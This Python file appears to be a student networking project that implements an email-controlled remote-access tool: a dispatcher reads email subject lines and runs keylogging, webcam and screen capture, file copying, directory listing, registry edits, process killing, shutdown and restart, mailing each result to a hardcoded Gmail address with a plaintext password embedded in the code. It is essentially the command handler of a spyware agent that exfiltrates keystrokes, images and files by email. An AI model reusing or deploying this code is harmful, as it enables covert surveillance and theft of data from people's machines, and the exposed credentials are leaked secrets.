from re import sub
import ReceiveEmail
import SendEmail
import ListProcesses
import keylogger
from time import time, sleep
import WebcamCapture
import Registry
import ListDir
import Restart
import Shutdown
import ScreenCapture
import KillProcess

client_address = "client1.computernetwork@gmail.com"


client_pass="computernetwork" #unsecure


# guess_address = "lmtri.fit.hcmus@gmail.com"
guess_address = "letrong2307@gmail.com"
thread = None
def Handling(subject):
    global thread
    if subject == 'List Processes':
        content = ListProcesses.ListProcesses()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "Webcam Capture":
        content = WebcamCapture.CapturePath
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'image')
    elif subject == "Start Key Logging":
        thread = keylogger.StartLogging()
        content = "Key logging has been launched"
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "End Key Logging":
        content =   keylogger.EndLogging(thread)
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject[0] == "COPY FILE":
        content = subject[1]
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'file')
    elif subject[0] == "LIST DIR":
        content = ListDir.listDir(subject[1])
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject[0] =="REGISTRY":
        content =  Registry.Registry(subject[1], subject[2], subject[3], subject[4], subject[5])
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "Screen Capture":
        content = ScreenCapture.ScreenCapture()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'image')
    elif subject == 'Shutdown':
        content = Shutdown.Shutdown()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == 'Restart':
        content = Restart.Restart()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject[:12] == 'Kill Process':
        content = KillProcess.KillProcess(subject[13:])
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    else:
        print("Can't run!")
        
def run(list_sub, detail_litst):
    # while True:
        # Nhận danh sách title của các thư "CHƯA ĐỌC"
    # global list_sub
    # global detail_list
    # list_sub, detail_list = ReceiveEmail.ReceiveEmail(client_address,client_pass)
    if len(list_sub):
        for i in list_sub:
            #Xử lý các title tương ứng
            Handling(i)
    # sleep(5)
        # else:
        #     print("Không có thư nào chưa đọc")
        # break
        # Handling("demo send picture")
        # break


#======================================================

# if __name__ == "__main__":
#     run()
